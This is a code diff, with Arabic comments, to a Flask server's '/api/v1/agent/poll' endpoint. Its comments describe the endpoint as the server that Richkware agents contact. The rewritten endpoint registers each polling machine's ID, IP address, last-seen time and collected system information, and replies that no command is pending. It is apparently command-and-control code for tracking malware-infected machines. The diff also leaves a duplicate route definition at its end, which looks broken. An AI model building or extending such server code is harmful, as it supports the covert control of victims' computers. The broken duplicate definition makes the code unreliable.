@@ -35,35 +35,40 @@ def encrypt_data(data):
     return data
 
 # ==================== نقطة النهاية اللي Richkware يتصل بها ====================
+# ابحث عن الدالة القديمة التي تبدأ بـ:
+# @app.route('/api/v1/agent/poll', methods=['POST'])
+# def poll_commands():
+# ...
+
+# واستبدلها بالكامل بهذه النسخة المطورة (تأكد أن الاسم موجود مرة واحدة فقط)
+
 @app.route('/api/v1/agent/poll', methods=['POST'])
 def poll_commands():
     try:
-        # طباعة كل ما يصلنا لنفهمه
+        # طباعة البيانات الخام القادمة من C++ لفهم المشكلة
         print(f"\n[!] Incoming Poll from: {request.remote_addr}")
-        
-        # محاولة قراءة البيانات حتى لو لم تكن JSON
         raw_data = request.get_data()
-        print(f"[*] Raw Data received: {raw_data}")
+        print(f"[*] Raw Data: {raw_data}")
 
-        # استخراج agent_id بطريقة مرنة
         data = request.get_json(silent=True) or {}
         agent_id = data.get('agent_id', 'unknown_agent')
 
-        # تحديث بيانات الجهاز
+        # تحديث حالة الجهاز
         agents[agent_id] = {
             'last_seen': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
             'ip': request.remote_addr,
-            'status': 'Online'
+            'status': 'Online',
+            'system_info': data.get('system_info', {})
         }
 
-        # الرد الافتراضي (Richkware يتوقع JSON)
+        # الرد الذي يتوقعه Richkware
         return jsonify({
             'has_command': False,
             'server_time': datetime.now().isoformat()
         }), 200
 
     except Exception as e:
-        print(f"[-] Error in Poll: {e}")
+        print(f"[-] Error: {e}")
         return jsonify({'error': str(e)}), 500
 
 @app.route('/api/v1/agent/poll', methods=['POST'])
